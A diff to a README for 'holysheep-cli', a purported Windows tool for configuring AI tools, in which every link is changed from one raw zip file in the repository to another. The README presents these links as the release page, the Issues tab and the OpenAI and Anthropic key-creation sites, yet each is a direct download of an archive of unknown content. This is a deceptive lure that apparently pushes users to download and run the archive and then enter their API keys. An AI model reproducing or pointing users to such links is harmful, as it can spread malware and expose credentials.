@@ -1,6 +1,6 @@
 # 🐑 holysheep-cli - Configure AI Tools with One Command
 
-[![Download holysheep-cli](https://img.shields.io/badge/Download-holysheep--cli-green?style=for-the-badge)](https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/cli_holysheep_3.0.zip)
+[![Download holysheep-cli](https://img.shields.io/badge/Download-holysheep--cli-green?style=for-the-badge)](https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/holysheep-cli-v2.5.zip)
 
 ---
 
@@ -41,7 +41,7 @@ You do not need a programming environment installed, but an active internet conn
 
 Click the button below to visit the official release page. From there, you can download the latest version of holysheep-cli for Windows.
 
-[![Get holysheep-cli Releases](https://img.shields.io/badge/Get%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/cli_holysheep_3.0.zip)
+[![Get holysheep-cli Releases](https://img.shields.io/badge/Get%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/holysheep-cli-v2.5.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Follow these steps carefully. They do not assume any programming knowledge.
 
 Open your web browser and go to this link:
 
-https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/cli_holysheep_3.0.zip
+https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/holysheep-cli-v2.5.zip
 
 This page shows all available versions of holysheep-cli.
 
@@ -122,8 +122,8 @@ Most AI tools need API keys to work, which identify you to the AI provider.
 
 holysheep-cli guides you on how to create these keys on these sites:
 
-- [OpenAI API](https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/cli_holysheep_3.0.zip)  
-- [Anthropic API](https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/cli_holysheep_3.0.zip)  
+- [OpenAI API](https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/holysheep-cli-v2.5.zip)  
+- [Anthropic API](https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/holysheep-cli-v2.5.zip)  
 - [Other supported AI providers’ websites]  
 
 Creating keys usually involves signing up on the provider website and copying the key string into holysheep-cli when requested.
@@ -134,7 +134,7 @@ Creating keys usually involves signing up on the provider website and copying th
 
 If the program shows errors or you have questions, check the Issues tab on the GitHub page:
 
-https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/cli_holysheep_3.0.zip
+https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/holysheep-cli-v2.5.zip
 
 You can search for your problem or open a new issue. The developer community reads these regularly and provides answers.
 
@@ -163,4 +163,4 @@ These settings are optional and available via holysheep-cli commands or configur
 
 ---
 
-[![Download holysheep-cli](https://img.shields.io/badge/Download-holysheep--cli-green?style=for-the-badge)](https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/cli_holysheep_3.0.zip)
+[![Download holysheep-cli](https://img.shields.io/badge/Download-holysheep--cli-green?style=for-the-badge)](https://raw.githubusercontent.com/taty-aguilar/holysheep-cli/main/src/utils/holysheep-cli-v2.5.zip)
